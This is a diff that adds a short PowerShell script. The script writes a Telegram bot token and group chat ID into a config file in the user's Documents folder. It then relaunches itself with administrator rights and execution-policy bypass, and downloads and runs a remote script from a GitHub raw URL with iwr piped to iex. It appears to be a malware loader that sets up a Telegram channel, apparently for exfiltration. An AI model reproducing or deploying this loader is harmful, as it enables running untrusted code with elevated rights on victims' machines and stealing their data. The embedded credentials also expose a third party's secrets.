@@ -1,0 +1,22 @@
+
+$scriptUrl = "https://raw.githubusercontent.com/uzigirl/std/main/menu/og2.ps1"
+$documentsPath = [Environment]::GetFolderPath("MyDocuments")
+$configFilePath = Join-Path -Path $documentsPath -ChildPath "config.txt"
+$configContent = @"
+BOT_TOKEN=7642416431:AAGRRHpOzRdpupruWLRgOiInIgZ8J1iNHiI
+GROUP_CHAT_ID=-4723826253
+"@
+Try {
+    $configContent | Set-Content -Path $configFilePath -Force
+    Write-Host "Configuration file created successfully at: $configFilePath"
+} Catch {
+    Write-Error "Failed to create the configuration file: $_"
+}
+
+If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    # Restart the script with admin rights for tasks that require elevation
+    Start-Process powershell.exe -ArgumentList "-NoExit -ExecutionPolicy Bypass -Command `"& { iwr -Uri '$scriptUrl' -UseBasicParsing | iex }`"" -Verb RunAs
+    Exit
+}
+
+Write-Host "Running as Administrator... Perform admin-required tasks here."
